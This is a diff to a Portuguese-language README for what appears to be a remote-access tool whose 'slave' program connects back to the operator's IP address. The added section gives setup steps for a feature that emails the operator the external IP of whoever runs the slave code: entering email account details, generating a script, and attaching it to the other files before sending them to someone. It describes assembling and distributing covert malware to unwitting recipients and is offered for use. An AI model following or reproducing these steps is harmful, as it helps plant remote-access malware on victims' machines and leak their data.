@@ -36,3 +36,19 @@ Para executar o escravo é necessario antes fazer uma pequena alteração
 Na linha 179 é necessario inserir seu endereço IP
 
 OBS: Caso esteja abaixo de um NAT é necessario utilizar algum programa que mantenha seu IP ativo na internet
+```
+
+### Configurando o envio de IP
+
+O envio de IP se baseia em um codigo escrito em Python, criado por Phoemur, que busca seu endereço de IP publico, em um site aleatorio prensete na lista.
+Neste projeto este foi alterado para enviar o endereço IP externo de quem faz a execução do codigo escravo
+
+Suas configurações são feitas da seguinte maneira 
+
+```
+* Edite o código "pass_string.py" com suas informações de conta de email
+* Execute o código "setup_pass_string.py"
+* Em seguida rode o código gerado pelo "setup_pass_string.py"
+* Pronto agora basta anexar o codigo gerado no passo acima aos demais arquivos e fazer o envio
+OBS: Observe os caminhos de origem e destino de cada um dos scripts antes de executa-los
+```
